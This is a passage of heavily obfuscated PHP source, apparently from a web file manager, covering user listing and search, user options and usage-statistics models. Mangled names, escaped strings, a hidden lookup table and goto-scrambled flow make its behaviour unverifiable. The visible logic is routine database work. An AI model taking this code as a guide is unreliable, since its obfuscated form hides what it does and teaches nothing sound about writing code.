userGroupRemove($F…£èø…Š÷, $EĞ‚Ššˆ) { $D¬§Œí¡è• =& $_SERVER[Ö¹ñÒÁ²÷]; $bùØ™°ğìí = $this->getInfoSimple($F…£èø…Š÷); if (!$bùØ™°ğìí || !$EĞ‚Ššˆ) { return !1; } $dçÕ¯ê = array($D¬§Œí¡è•[1406] => $F…£èø…Š÷, $D¬§Œí¡è•[2152] => $EĞ‚Ššˆ); return Model($D¬§Œí¡è•[2154])->where($dçÕ¯ê)->delete(); } public function listData() { $FõÂñµ±‹¦ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($FõÂñµ±‹¦[$_SERVER[Ö¹ñÒÁ²÷][350]]); return $FõÂñµ±‹¦; } public function listByID($F™é…¨Äó) { $bœã’…‰¾ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$F™é…¨Äó) { return; } $bŠÑ«ã»´Æ = array($bœã’…‰¾[1415] => array($bœã’…‰¾[7], $F™é…¨Äó)); $aµ†šäœŠ = $this->where($bŠÑ«ã»´Æ)->select(); $this->_listDataApply($aµ†šäœŠ); return $aµ†šäœŠ; } public function listByGroup($BÂ’™Ë‘è» = 0, $f‚ÚÍËÖƒÊ = array()) { goto f‡¯¯†æ®; f‡¯¯†æ®: $a‹˜ğĞÎÑÈ =& $_SERVER[Ö¹ñÒÁ²÷]; $DÆŸÜèŠŠ£ = $a‹˜ğĞÎÑÈ[33]; $Fî –Áç…Ú = array(); goto FÁÅ¨à¤áŞ; FÁÅ¨à¤áŞ: if ($BÂ’™Ë‘è») { $Fî –Áç…Ú = array($a‹˜ğĞÎÑÈ[2503] => intval($BÂ’™Ë‘è»)); $DÆŸÜèŠŠ£ = "\x4c\105\106\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\165\x73\x65\x72\x5f\147\x72\x6f\x75\160\40\x75\x73\x65\x72\137\x67\x72\157\165\160\40\x6f\156\x20\x75\163\x65\x72\56\x75\163\145\x72\x49\104\x20\75\40\165\x73\145\162\x5f\147\162\157\x75\160\56\165\163\x65\x72\111\x44"; $EÍ±Ã’¸ = Input::get($a‹˜ğĞÎÑÈ[403], null, $a‹˜ğĞÎÑÈ[33]) ? $a‹˜ğĞÎÑÈ[33] : $a‹˜ğĞÎÑÈ[2504]; } if (isset($f‚ÚÍËÖƒÊ[$a‹˜ğĞÎÑÈ[686]])) { $Fî –Áç…Ú[$a‹˜ğĞÎÑÈ[2505]] = $f‚ÚÍËÖƒÊ[$a‹˜ğĞÎÑÈ[686]]; } $a½Ù²ƒğôù = $this->_makeOrder($EÍ±Ã’¸)->field($a‹˜ğĞÎÑÈ[2506])->where($Fî –Áç…Ú)->join($DÆŸÜèŠŠ£)->selectPage(50); goto Añ±ÛĞ”Ö; Añ±ÛĞ”Ö: $this->_listDataApply($a½Ù²ƒğôù[$a‹˜ğĞÎÑÈ[350]]); return $a½Ù²ƒğôù; goto fÂ´Âí¢…‡; fÂ´Âí¢…‡: } private function _makeOrder($eÖÍ¤×Ş‘‘ = '') { goto E¨‡ä„•ºË; D–â¸í‰»: $eÖÍ¤×Ş‘‘ = $eÖÍ¤×Ş‘‘ . "\x75\163\x65\162\x2e{$EÉØò‰³Ä¢}\40{$B¤¦¦®ó}\x2c\x20\x75\163\x65\162\x2e\x75\x73\145\162\111\104\40\141\163\x63"; return $this->alias($F®ë´ª¡¹[2250])->order($eÖÍ¤×Ş‘‘); goto B¿ÙŞ°×¾; E¨‡ä„•ºË: $F®ë´ª¡¹ =& $_SERVER[Ö¹ñÒÁ²÷]; $AŒ¦Á¼–Œ– = array($F®ë´ª¡¹[1415], $F®ë´ª¡¹[28], $F®ë´ª¡¹[2065], $F®ë´ª¡¹[2038], $F®ë´ª¡¹[183]); $D¶‚îùÍŒ = array($F®ë´ª¡¹[398] => $F®ë´ª¡¹[399], $F®ë´ª¡¹[400] => $F®ë´ª¡¹[401]); goto bÀŞ¡ê¶ø; bÀŞ¡ê¶ø: $EÉØò‰³Ä¢ = Input::get($F®ë´ª¡¹[403], $F®ë´ª¡¹[7], $F®ë´ª¡¹[1406], $AŒ¦Á¼–Œ–); $B¤¦¦®ó = Input::get($F®ë´ª¡¹[404], $F®ë´ª¡¹[7], $F®ë´ª¡¹[2155], array($F®ë´ª¡¹[2155], $F®ë´ª¡¹[400])); $B¤¦¦®ó = $D¶‚îùÍŒ[$B¤¦¦®ó]; goto D–â¸í‰»; B¿ÙŞ°×¾: } public function listSearch($dôí‡Üªê) { goto c³Ğ™—Ë’; eÓæİœƒÔ: if (!$eƒÇÌºª¯É || count($eƒÇÌºª¯É[$fó×™–ŒÕ×[350]]) < 5 && Input::check($Dˆ¬Û„Ã›, $fó×™–ŒÕ×[302])) { $e¹êôÜ¹‰œ = $this->_searchFromMeta($fó×™–ŒÕ×[411], $Dˆ¬Û„Ã›, 10); $dÌÎ¨Ü‚­ = $this->_searchFromMeta($fó×™–ŒÕ×[412], $Dˆ¬Û„Ã›, 10); $eïâ‰•“ªç = array_merge($e¹êôÜ¹‰œ, $dÌÎ¨Ü‚­, $eƒÇÌºª¯É[$fó×™–ŒÕ×[350]]); $eƒÇÌºª¯É[$fó×™–ŒÕ×[350]] = array_unique_by_key($eïâ‰•“ªç, $fó×™–ŒÕ×[1415]); $eƒÇÌºª¯É[$fó×™–ŒÕ×[347]][$fó×™–ŒÕ×[348]] = count($eƒÇÌºª¯É[$fó×™–ŒÕ×[350]]); $eƒÇÌºª¯É[$fó×™–ŒÕ×[347]][$fó×™–ŒÕ×[349]] = ceil($eƒÇÌºª¯É[$fó×™–ŒÕ×[347]][$fó×™–ŒÕ×[348]] / $eƒÇÌºª¯É[$fó×™–ŒÕ×[347]][$fó×™–ŒÕ×[345]]); } $this->_listDataApply($eƒÇÌºª¯É[$fó×™–ŒÕ×[350]]); $this->_filterByGroup($eƒÇÌºª¯É, $cëÒó˜é‘Š); goto dˆİ¦‰á; c³Ğ™—Ë’: $fó×™–ŒÕ× =& $_SERVER[Ö¹ñÒÁ²÷]; $Dˆ¬Û„Ã› = $dôí‡Üªê[$fó×™–ŒÕ×[2156]]; $cëÒó˜é‘Š = isset($dôí‡Üªê[$fó×™–ŒÕ×[2157]]) ? $dôí‡Üªê[$fó×™–ŒÕ×[2157]] : !1; goto EÇ×ÌÀ¶¯¾; EÇ×ÌÀ¶¯¾: $Dˆ¬Û„Ã› = str_replace($fó×™–ŒÕ×[2158], $fó×™–ŒÕ×[2159], trim($Dˆ¬Û„Ã›)); $bÙïçĞ‰À´ = array($fó×™–ŒÕ×[28] => array($fó×™–ŒÕ×[748], "\x25{$Dˆ¬Û„Ã›}\x25"), $fó×™–ŒÕ×[289] => array($fó×™–ŒÕ×[748], "\45{$Dˆ¬Û„Ã›}\x25"), $fó×™–ŒÕ×[2307] => array($fó×™–ŒÕ×[748], "\45{$Dˆ¬Û„Ã›}\45"), $fó×™–ŒÕ×[910] => $fó×™–ŒÕ×[2160]); if (Input::check($Dˆ¬Û„Ã›, $fó×™–ŒÕ×[295])) { $bÙïçĞ‰À´[$fó×™–ŒÕ×[1415]] = array($fó×™–ŒÕ×[748], "\45{$Dˆ¬Û„Ã›}\45"); $bÙïçĞ‰À´[$fó×™–ŒÕ×[2486]] = array($fó×™–ŒÕ×[748], "\x25{$Dˆ¬Û„Ã›}\x25"); } goto A‘ĞŒôÍ¬; dˆİ¦‰á: return $eƒÇÌºª¯É; goto A»Éğö¡ÕÜ; A‘ĞŒôÍ¬: if (!$Dˆ¬Û„Ã›) { $bÙïçĞ‰À´ = array(); } if (isset($dôí‡Üªê[$fó×™–ŒÕ×[686]])) { $bÙïçĞ‰À´[$fó×™–ŒÕ×[686]] = $dôí‡Üªê[$fó×™–ŒÕ×[686]]; } $eƒÇÌºª¯É = $this->_makeOrder()->where($bÙïçĞ‰À´)->selectPage(20); goto eÓæİœƒÔ; A»Éğö¡ÕÜ: } private function _filterByGroup(&$b¾À™ÈËƒ´, $F¤è†¡ß¢´) { $e›»àæÍ†à =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$F¤è†¡ß¢´) { return $b¾À™ÈËƒ´; } foreach ($b¾À™ÈËƒ´[$e›»àæÍ†à[350]] as $B–¢ÍÆ±Ø· => &$a©‹ŠĞï) { $c±©Ó¦§İ = array_to_keyvalue($a©‹ŠĞï[$e›»àæÍ†à[2507]], $e›»àæÍ†à[33], $e›»àæÍ†à[2079]); if (!in_array($F¤è†¡ß¢´, $c±©Ó¦§İ)) { unset($b¾À™ÈËƒ´[$e›»àæÍ†à[350]][$B–¢ÍÆ±Ø·]); } } $b¾À™ÈËƒ´[$e›»àæÍ†à[350]] = array_values($b¾À™ÈËƒ´[$e›»àæÍ†à[350]]); $b¾À™ÈËƒ´[$e›»àæÍ†à[347]] = array($e›»àæÍ†à[2283] => count($b¾À™ÈËƒ´[$e›»àæÍ†à[350]]), $e›»àæÍ†à[2281] => $b¾À™ÈËƒ´[$e›»àæÍ†à[347]][$e›»àæÍ†à[345]], $e›»àæÍ†à[2280] => 1, $e›»àæÍ†à[2282] => 1); } private function _searchFromMeta($EĞ›á‚Àñ±, $DÇùÓÂò®, $eàÊ…ùÌ•) { goto eÚ²ºÄ‰—õ; BÊ­øĞË…œ: $Dù©÷ŒÎÜÀ = $this->where(array($eˆ‰¨‰¿…ù[1406] => array($eˆ‰¨‰¿…ù[7], $B÷ïæĞ¾É¤)))->select(); if (!$Dù©÷ŒÎÜÀ) { return array(); } return $Dù©÷ŒÎÜÀ; goto C¾ùŠù¨ôã; F†åÓ‹µÆÃ: $B÷ïæĞ¾É¤ = Model($eˆ‰¨‰¿…ù[2508])->where($bšÎ”†§Ëƒ)->limit($eàÊ…ùÌ•)->select(); if (!$B÷ïæĞ¾É¤) { return array(); } $B÷ïæĞ¾É¤ = array_to_keyvalue($B÷ïæĞ¾É¤, $eˆ‰¨‰¿…ù[33], $eˆ‰¨‰¿…ù[1415]); goto BÊ­øĞË…œ; eÚ²ºÄ‰—õ: $eˆ‰¨‰¿…ù =& $_SERVER[Ö¹ñÒÁ²÷]; $DÇùÓÂò® = strtolower($DÇùÓÂò®); $bšÎ”†§Ëƒ = array($eˆ‰¨‰¿…ù[89] => $EĞ›á‚Àñ±, $eˆ‰¨‰¿…ù[355] => array($eˆ‰¨‰¿…ù[748], "\x25{$DÇùÓÂò®}\45")); goto F†åÓ‹µÆÃ; C¾ùŠù¨ôã: } private function _listDataApplyItem($eçêáÄ¸–‘) { $Dà°¡œÛƒ = array($eçêáÄ¸–‘); $this->_listDataApply($Dà°¡œÛƒ); return $Dà°¡œÛƒ[0]; } private function _listDataApply(&$EëÏô¶˜) { goto f…‹„Ì§Ôİ; B£¡ïÃ‚Ç‰: $FÎ´Ğ¨›Ñù = array_to_keyvalue($EëÏô¶˜, $D‚ë©éóÙ [33], $D‚ë©éóÙ [1415]); $this->_listAppendGroup($EëÏô¶˜, $FÎ´Ğ¨›Ñù); $this->_listAppendMeta($EëÏô¶˜, $FÎ´Ğ¨›Ñù); goto dí¼¢ìŞ‹Ê; f…‹„Ì§Ôİ: $D‚ë©éóÙ  =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$EëÏô¶˜) { return; } array_remove_key($EëÏô¶˜, $D‚ë©éóÙ [798]); goto B£¡ïÃ‚Ç‰; dí¼¢ìŞ‹Ê: $this->_listAppendSourceRoot($EëÏô¶˜, $FÎ´Ğ¨›Ñù); goto b”Øƒ…·¼‡; b”Øƒ…·¼‡: } private function _listAppendSourceRoot(&$CÑé¹ƒŠº¥, $DåôñŞÈ–Ô) { goto C®Ø›ÔÌ”ä; E‡ÚÃ¥ê“ã: $EëñÊé°ëĞ = Model($d×ª­¶ÀŸ‡[749])->order($d×ª­¶ÀŸ‡[2167])->field($CˆºÇçóÎ)->where($dÎæ©Í‹æê)->select(); $EëñÊé°ëĞ = array_to_keyvalue($EëñÊé°ëĞ, $d×ª­¶ÀŸ‡[452]); $EëñÊé°ëĞ = array_remove_key($EëñÊé°ëĞ, $d×ª­¶ÀŸ‡[452]); goto dÈø†…í¨; dÈø†…í¨: foreach ($CÑé¹ƒŠº¥ as &$D²ëÎ‘­µ¿) { $D²ëÎ‘­µ¿[$d×ª­¶ÀŸ‡[387]] = $EëñÊé°ëĞ[$D²ëÎ‘­µ¿[$d×ª­¶ÀŸ‡[1415]]] ? $EëñÊé°ëĞ[$D²ëÎ‘­µ¿[$d×ª­¶ÀŸ‡[1415]]] : array(); } goto b¿æ©±; C®Ø›ÔÌ”ä: $d×ª­¶ÀŸ‡ =& $_SERVER[Ö¹ñÒÁ²÷]; $dÎæ©Í‹æê = array($d×ª­¶ÀŸ‡[457] => 0, $d×ª­¶ÀŸ‡[367] => SourceModel::TYPE_USER, $d×ª­¶ÀŸ‡[452] => array($d×ª­¶ÀŸ‡[7], $DåôñŞÈ–Ô)); $CˆºÇçóÎ = $d×ª­¶ÀŸ‡[2166]; goto E‡ÚÃ¥ê“ã; b¿æ©±: } private function _listAppendGroup(&$a…öØ§‚ŠÕ, $EÅª«é…ÄÄ) { goto Aîá¾ğ»å ; e¥àÂëÎ: $EÄšè¬ˆ×Ï = array_to_keyvalue_group($EÄšè¬ˆ×Ï, $dĞèôÑöÚŠ[1415]); foreach ($EÄšè¬ˆ×Ï as &$eóîøØ·×) { $D‹ƒ£¾ØŞ = array(); foreach ($eóîøØ·× as $Cò±–Š¸´…) { if (!$Cò±–Š¸´…[$dĞèôÑöÚŠ[2208]]) { continue; } $Fñ°Ò™°À = Model($dĞèôÑöÚŠ[2227])->listData($Cò±–Š¸´…[$dĞèôÑöÚŠ[2208]]); $D‹ƒ£¾ØŞ[] = array($dĞèôÑöÚŠ[2079] => $Cò±–Š¸´…[$dĞèôÑöÚŠ[2079]], $dĞèôÑöÚŠ[2511] => $A“¿ø½³êŠ[$Cò±–Š¸´…[$dĞèôÑöÚŠ[2079]]], $dĞèôÑöÚŠ[372] => $Fñ°Ò™°À); } $eóîøØ·× = $D‹ƒ£¾ØŞ; } foreach ($a…öØ§‚ŠÕ as &$bŒ‚˜ªİ‚ä) { $bŒ‚˜ªİ‚ä[$dĞèôÑöÚŠ[2507]] = array(); if (isset($EÄšè¬ˆ×Ï[$bŒ‚˜ªİ‚ä[$dĞèôÑöÚŠ[1415]]])) { $bŒ‚˜ªİ‚ä[$dĞèôÑöÚŠ[2507]] = $EÄšè¬ˆ×Ï[$bŒ‚˜ªİ‚ä[$dĞèôÑöÚŠ[1415]]]; } } goto fïÌÄÉ«Ù¦; Aîá¾ğ»å : $dĞèôÑöÚŠ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÈíè–¬±À = array($dĞèôÑöÚŠ[1415] => array($dĞèôÑöÚŠ[7], $EÅª«é…ÄÄ)); $EÄšè¬ˆ×Ï = Model($dĞèôÑöÚŠ[2154])->where($cÈíè–¬±À)->select(); goto d†‡ÎÑ´ƒ‹; E¾½´­—«Ã: $cÈíè–¬±À = array($dĞèôÑöÚŠ[2079] => array($dĞèôÑöÚŠ[7], $DîÅİÊ‡)); $AšÊÖˆ±ãÙ = Model($dĞèôÑöÚŠ[2509])->field($dĞèôÑöÚŠ[2510])->where($cÈíè–¬±À)->select(); $A“¿ø½³êŠ = array_to_keyvalue($AšÊÖˆ±ãÙ, $dĞèôÑöÚŠ[2079], $dĞèôÑöÚŠ[28]); goto e¥àÂëÎ; d†‡ÎÑ´ƒ‹: $DîÅİÊ‡ = array_to_keyvalue($EÄšè¬ˆ×Ï, $dĞèôÑöÚŠ[33], $dĞèôÑöÚŠ[2079]); $DîÅİÊ‡ = array_remove_value(array_unique($DîÅİÊ‡), $dĞèôÑöÚŠ[464]); if (!$DîÅİÊ‡ || !$EÄšè¬ˆ×Ï) { return; } goto E¾½´­—«Ã; fïÌÄÉ«Ù¦: } private function _listAppendMeta(&$FÍ«‹›æ°›, $c¾”ˆííŸ¬) { goto cñ´ø§ƒ; cñ´ø§ƒ: $cø«ŠÖ˜À =& $_SERVER[Ö¹ñÒÁ²÷]; $bÈ†¢¥ˆÈ± = UserJobModel::JOB_KEY; $c´Şë¯ØŞÅ = array($cø«ŠÖ˜À[2488]); goto F¡‘‘…¬·; F¡‘‘…¬·: $D”ÛˆŒ»øä = array($cø«ŠÖ˜À[1415] => array($cø«ŠÖ˜À[7], $c¾”ˆííŸ¬)); $B†µÏšÈØ… = Model($cø«ŠÖ˜À[2485])->where($D”ÛˆŒ»øä)->select(); $B†µÏšÈØ… = array_to_keyvalue_group($B†µÏšÈØ…, $cø«ŠÖ˜À[1415]); goto fØààÔØï¯; fØààÔØï¯: foreach ($B†µÏšÈØ… as &$DŞÁù½°µÅ) { $f©› ´…¬› = array(); foreach ($DŞÁù½°µÅ as $f»«¯ÒËÜ‚) { if (!in_array($f»«¯ÒËÜ‚[$cø«ŠÖ˜À[89]], $c´Şë¯ØŞÅ)) { $f©› ´…¬›[$f»«¯ÒËÜ‚[$cø«ŠÖ˜À[89]]] = $f»«¯ÒËÜ‚[$cø«ŠÖ˜À[355]]; } } $DŞÁù½°µÅ = $f©› ´…¬›; } $c›®Ñ¤¨»Ù = Model($cø«ŠÖ˜À[2512]); foreach ($FÍ«‹›æ°› as &$f™ŞÁÓã“) { $fêÂŸâö—ç = array(); if (isset($B†µÏšÈØ…[$f™ŞÁÓã“[$cø«ŠÖ˜À[1415]]])) { $fêÂŸâö—ç = $B†µÏšÈØ…[$f™ŞÁÓã“[$cø«ŠÖ˜À[1415]]]; } $f™ŞÁÓã“[$cø«ŠÖ˜À[2513]] = array(); if (isset($fêÂŸâö—ç[$bÈ†¢¥ˆÈ±])) { $f™ŞÁÓã“[$cø«ŠÖ˜À[2513]] = $c›®Ñ¤¨»Ù->getUserJobInfo($fêÂŸâö—ç[$bÈ†¢¥ˆÈ±]); } } goto e‹ÛŠ‹Œš©; e‹ÛŠ‹Œš©: } public function userSearch($c†ÒæòÍÒš, $DËàòÄ„²™ = "\x2a") { return Model($_SERVER[Ö¹ñÒÁ²÷][473])->where($c†ÒæòÍÒš)->field($DËàòÄ„²™)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\x72\x5f\157\160\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($eÃš™¯ÔÁ) { $D£ÂòµÇğö =& $_SERVER[Ö¹ñÒÁ²÷]; if (!defined($D£ÂòµÇğö[423])) { define($D£ÂòµÇğö[423], 0); } return "\x55\163\x65\162\117\x70\x74\151\157\x6e\137{$eÃš™¯ÔÁ}\x5f" . USER_ID; } protected function filterWhere($AÜªÖºñ‹‘) { $A½‰¾£¾‚ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!defined($A½‰¾£¾‚[423])) { define($A½‰¾£¾‚[423], 0); } $AÜªÖºñ‹‘[$A½‰¾£¾‚[1415]] = USER_ID; return $AÜªÖºñ‹‘; } public function cacheRemoveUser($eè–ÂÂ‘Şë, $Aèåˆ–ŸÆ) { return Cache::remove("\125\x73\x65\x72\x4f\160\x74\x69\x6f\x6e\x5f{$eè–ÂÂ‘Şë}\137" . $Aèåˆ–ŸÆ); } protected function optionDefault($eªºÚÅº = '') { $C¬÷œˆ¹›¨ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($eªºÚÅº == $C¬÷œˆ¹›¨[33]) { return $GLOBALS[$C¬÷œˆ¹›¨[6]][$C¬÷œˆ¹›¨[2514]]; } if ($eªºÚÅº == $C¬÷œˆ¹›¨[2515]) { return $GLOBALS[$C¬÷œˆ¹›¨[6]][$C¬÷œˆ¹›¨[2516]]; } } } goto Bî¼ŠÏáñŞ; E˜ ĞÌøÄŸ: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($f¶ë¨ªŒÃ) { $e·‘Üİ˜¢» =& $_SERVER[Ö¹ñÒÁ²÷]; $Aäî˜”ºáš = array($e·‘Üİ˜¢»[531] => array($e·‘Üİ˜¢»[29] => $e·‘Üİ˜¢»[2005], $e·‘Üİ˜¢»[257] => array($e·‘Üİ˜¢»[206], $e·‘Üİ˜¢»[697], $e·‘Üİ˜¢»[2006], $e·‘Üİ˜¢»[2007])), $e·‘Üİ˜¢»[2008] => array($e·‘Üİ˜¢»[29] => $e·‘Üİ˜¢»[2009], $e·‘Üİ˜¢»[257] => array($e·‘Üİ˜¢»[206], $e·‘Üİ˜¢»[695], $e·‘Üİ˜¢»[2010], $e·‘Üİ˜¢»[2011], $e·‘Üİ˜¢»[2012]))); if (!isset($Aäî˜”ºáš[$f¶ë¨ªŒÃ])) { return !1; } $this->optionType = $Aäî˜”ºáš[$f¶ë¨ªŒÃ][$e·‘Üİ˜¢»[29]]; $this->field = $Aäî˜”ºáš[$f¶ë¨ªŒÃ][$e·‘Üİ˜¢»[257]]; return !0; } public function listData($Aï—ÓšãÙ” = false, $D‰Æ•Àâô = "\x6d\157\x64\151\x66\x79\124\x69\x6d\x65", $D´äòƒ™ËÀ = false) { return parent::listData($Aï—ÓšãÙ”, $D‰Æ•Àâô, $D´äòƒ™ËÀ); } public function trendList($d§ˆ¿êÕª³) { goto c«¸ùª·º©; cë¾–£ğ§: foreach ($D˜‡³ŸÕ´ as $E±áÆö–İ†) { $this->{$D„¦Œì‘…ç}($E±áÆö–İ†); } return $this->listData(); goto D›§‚ÍÀ¯‡; a©¯Ç‡¿ö¾: if (!isset($dšÉ‘Ëƒåì)) { $C¨¿ÎÌ÷† = $d§ˆ¿êÕª³ == $c»öÌ¹­å…[531] ? $c»öÌ¹­å…[473] : $c»öÌ¹­å…[749]; $dšÉ‘Ëƒåì = Model($C¨¿ÎÌ÷†)->min($c»öÌ¹­å…[183]); } $D„¦Œì‘…ç = $c»öÌ¹­å…[2015] . ucfirst($d§ˆ¿êÕª³); $D˜‡³ŸÕ´ = $this->dateList($dšÉ‘Ëƒåì); goto cë¾–£ğ§; c«¸ùª·º©: $c»öÌ¹­å… =& $_SERVER[Ö¹ñÒÁ²÷]; $F¡•İ¡Ò½ó = $this->listData(); if ($F¡•İ¡Ò½ó) { $Dªê·‡ö = end($F¡•İ¡Ò½ó); $E±áÆö–İ† = date($c»öÌ¹­å…[2013], strtotime($c»öÌ¹­å…[2014])); if ($Dªê·‡ö[$c»öÌ¹­å…[206]] == $E±áÆö–İ†) { return $F¡•İ¡Ò½ó; } $dšÉ‘Ëƒåì = strtotime($Dªê·‡ö[$c»öÌ¹­å…[206]]); } goto a©¯Ç‡¿ö¾; D›§‚ÍÀ¯‡: } private function dateList($dˆ•ŒÉ®¨ö) { $bõœàóùÄ =& $_SERVER[Ö¹ñÒÁ²÷]; $FÇ—¹Áœ„ä = $dˆ•ŒÉ®¨ö; $fğÁ“Ä¢²È = strtotime($bõœàóùÄ[2014]); $A¡ ¶Ğ”×½ = array(); while ($FÇ—¹Áœ„ä <= $fğÁ“Ä¢²È) { $A¡ ¶Ğ”×½[] = date($bõœàóùÄ[2013], $FÇ—¹Áœ„ä); $FÇ—¹Áœ„ä = strtotime($bõœàóùÄ[2016], $FÇ—¹Áœ„ä); } return $A¡ ¶Ğ”×½; } public function _recordUser($f©¨Ç¦³» = '') { goto A¢±Ğ³± Ù; C‚²ŞÍù‚: $Aˆİ­´äØ = array($cÔ¶Í—Å¡Ï[183] => array($cÔ¶Í—Å¡Ï[923], $E‚İÍÉ’ä¼)); $d˜äÚøßò = Model($cÔ¶Í—Å¡Ï[473])->where($Aˆİ­´äØ)->count($cÔ¶Í—Å¡Ï[1415]); $Aˆİ­´äØ[$cÔ¶Í—Å¡Ï[183]] = array($cÔ¶Í—Å¡Ï[317], array($f¨ğíŠí×â, $E‚İÍÉ’ä¼)); goto fÉ§‹ªÅØ; fÉ§‹ªÅØ: $eÓÇ‹®šµñ = Model($cÔ¶Í—Å¡Ï[473])->where($Aˆİ­´äØ)->count($cÔ¶Í—Å¡Ï[1415]); $Aˆİ­´äØ[$cÔ¶Í—Å¡Ï[29]] = $cÔ¶Í—Å¡Ï[2019]; $a…Õñ˜Ø° = Model($cÔ¶Í—Å¡Ï[2020])->where($Aˆİ­´äØ)->count($cÔ¶Í—Å¡Ï[2021]); goto Aµ´ŸĞôÊ; A¢±Ğ³± Ù: $cÔ¶Í—Å¡Ï =& $_SERVER[Ö¹ñÒÁ²÷]; $f¨ğíŠí×â = strtotime(date($cÔ¶Í—Å¡Ï[2017], strtotime($f©¨Ç¦³»))); $E‚İÍÉ’ä¼ = strtotime(date($cÔ¶Í—Å¡Ï[2018], strtotime($f©¨Ç¦³»))); goto C‚²ŞÍù‚; Aµ´ŸĞôÊ: $cßóä³ï‚ = array($cÔ¶Í—Å¡Ï[206] => $f©¨Ç¦³», $cÔ¶Í—Å¡Ï[697] => (int) $d˜äÚøßò, $cÔ¶Í—Å¡Ï[2006] => (int) $eÓÇ‹®šµñ, $cÔ¶Í—Å¡Ï[2007] => (int) $a…Õñ˜Ø°); return $this->insert($cßóä³ï‚); goto CöèË¯‡¡„; CöèË¯‡¡„: } public function _recordStore($BĞ§Õ°¹ß› = '') { goto EÎ­Å””‡„; D¾çîÙÃÁ: $d”‡¯›Éò[$BÛ·ƒˆ«Û[367]] = 1; $e‰ÇÅÚŠ§ = Model($BÛ·ƒˆ«Û[749])->where($d”‡¯›Éò)->sum($BÛ·ƒˆ«Û[77]); $d”‡¯›Éò[$BÛ·ƒˆ«Û[367]] = 2; goto cæƒ‡¨Œê; EÎ­Å””‡„: $BÛ·ƒˆ«Û =& $_SERVER[Ö¹ñÒÁ²÷]; $F“Ë­áÇ½ = strtotime(date($BÛ·ƒˆ«Û[2018], strtotime($BĞ§Õ°¹ß›))); $d”‡¯›Éò = array($BÛ·ƒˆ«Û[183] => array($BÛ·ƒˆ«Û[923], $F“Ë­áÇ½)); goto c¸ùÚ¥Ñ‘ô; cæƒ‡¨Œê: $CöŸŒ‘šĞÜ = Model($BÛ·ƒˆ«Û[749])->where($d”‡¯›Éò)->sum($BÛ·ƒˆ«Û[77]); $Dº…ÚíÒËí = array($BÛ·ƒˆ«Û[206] => $BĞ§Õ°¹ß›, $BÛ·ƒˆ«Û[695] => (int) $E“†¬ÎÃ, $BÛ·ƒˆ«Û[2010] => (int) $a‡Ïå•¾Ûë, $BÛ·ƒˆ«Û[2011] => (int) $e‰ÇÅÚŠ§, $BÛ·ƒˆ«Û[2012] => (int) $CöŸŒ‘šĞÜ); return $this->insert($Dº…ÚíÒËí); goto CÑ Á·£ª; c¸ùÚ¥Ñ‘ô: $a‡Ïå•¾Ûë = Model($BÛ·ƒˆ«Û[418])->where($d”‡¯›Éò)->sum($BÛ·ƒˆ«Û[77]); $d”‡¯›Éò[$BÛ·ƒˆ«Û[366]] = 0; $E“†¬ÎÃ = Model($BÛ·ƒˆ«Û[749])->where($d”‡¯›Éò)->sum($BÛ·ƒˆ«Û[77]); goto D¾çîÙÃÁ; CÑ Á·£ª: } public function trend($f¯ìÔª¹¯Î, $BÄÒØ‹’¿) { goto A·ôø¦„×í; A·ôø¦„×í: $a«Ï¿ƒÒÄ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->init($f¯ìÔª¹¯Î)) { return !1; } $Aõ×ÅÃ”—‰ = $this->trendList($f¯ìÔª¹¯Î); goto EñÊ®·ô›Ù; EÚĞÙ”ğç­: return $b¤…ÑÚ; goto A–²ŒŸ°¨¡; EñÊ®·ô›Ù: if ($Aõ×ÅÃ”—‰ && $BÄÒØ‹’¿ != $a«Ï¿ƒÒÄ[1390]) { $fÖÂ¹À… = $Aõ×ÅÃ”—‰[0][$a«Ï¿ƒÒÄ[206]]; $dìÁ…‚ŞÉĞ = $this->validDate($BÄÒØ‹’¿, $fÖÂ¹À…); $eæª™…¬–¨ = array(); $fÀğ•½À§¤ = array_to_keyvalue($Aõ×ÅÃ”—‰, $a«Ï¿ƒÒÄ[206]); foreach ($dìÁ…‚ŞÉĞ as $C§×ßáÁ³¢) { if (isset($fÀğ•½À§¤[$C§×ßáÁ³¢])) { $fçË·í¿Š = $fÀğ•½À§¤[$C§×ßáÁ³¢]; } else { $fçË·í¿Š = end($Aõ×ÅÃ”—‰); $fçË·í¿Š[$a«Ï¿ƒÒÄ[206]] = $C§×ßáÁ³¢; if ($f¯ìÔª¹¯Î == $a«Ï¿ƒÒÄ[531]) { $fçË·í¿Š[$a«Ï¿ƒÒÄ[2006]] = $fçË·í¿Š[$a«Ï¿ƒÒÄ[2007]] = 0; } } $eæª™…¬–¨[] = $fçË·í¿Š; } $Aõ×ÅÃ”—‰ = $eæª™…¬–¨; } $eÎ†ò¦øÏÍ = array($a«Ï¿ƒÒÄ[531] => array($a«Ï¿ƒÒÄ[697] => LNG($a«Ï¿ƒÒÄ[2022]), $a«Ï¿ƒÒÄ[2006] => LNG($a«Ï¿ƒÒÄ[2023]), $a«Ï¿ƒÒÄ[2007] => LNG($a«Ï¿ƒÒÄ[2024])), $a«Ï¿ƒÒÄ[2008] => array($a«Ï¿ƒÒÄ[695] => LNG($a«Ï¿ƒÒÄ[2025]), $a«Ï¿ƒÒÄ[2010] => LNG($a«Ï¿ƒÒÄ[2026]), $a«Ï¿ƒÒÄ[2011] => LNG($a«Ï¿ƒÒÄ[2027]), $a«Ï¿ƒÒÄ[2012] => LNG($a«Ï¿ƒÒÄ[2028]))); $C‡ºà‘óØß = array($a«Ï¿ƒÒÄ[531] => $a«Ï¿ƒÒÄ[2029], $a«Ï¿ƒÒÄ[2008] => $a«Ï¿ƒÒÄ[77]); goto d´©á…‰; d´©á…‰: if (empty($Aõ×ÅÃ”—‰)) { $C§×ßáÁ³¢ = date($a«Ï¿ƒÒÄ[2013], strtotime($a«Ï¿ƒÒÄ[2014])); $aÈ¸òŠ‹óœ = array($a«Ï¿ƒÒÄ[206] => $C§×ßáÁ³¢); foreach 